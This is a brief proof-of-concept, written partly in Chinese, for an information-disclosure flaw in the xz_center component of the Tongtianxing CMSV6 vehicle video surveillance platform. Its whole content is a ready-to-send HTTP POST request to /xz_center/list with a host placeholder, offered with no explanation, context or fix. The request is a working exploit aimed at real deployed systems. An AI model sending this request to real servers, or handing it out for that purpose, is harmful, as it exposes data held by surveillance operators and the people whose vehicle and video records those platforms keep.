## 通天星CMSV6车载视频监控平台xz_center信息泄露漏洞




## poc

```
POST /xz_center/list HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close

page=1
```

